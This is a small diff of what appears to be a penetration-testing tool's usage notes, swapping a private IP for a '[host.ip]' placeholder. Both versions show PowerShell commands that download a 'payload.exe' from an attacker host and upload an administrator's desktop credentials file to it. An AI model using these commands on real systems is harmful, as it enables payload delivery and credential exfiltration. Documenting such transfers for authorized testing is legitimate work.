@@ -16,7 +16,7 @@ Visit http://[host.ip]:8080
 
 Option2:
 Download file  
-`Invoke-WebRequest -Uri http://192.168.49.66:8080/payload.exe -OutFile payload.exe`  
+`Invoke-WebRequest -Uri http://[host.ip]:8080/payload.exe -OutFile payload.exe`  
 Upload file  
-`Invoke-Restmethod -uri http://192.168.49.66:8080/credentials.zip -Method Put -Infile C:\\users\\administrator\\desktop\\credentials`  
+`Invoke-Restmethod -uri http://[host.ip]:8080/credentials.zip -Method Put -Infile C:\\users\\administrator\\desktop\\credentials`  
 
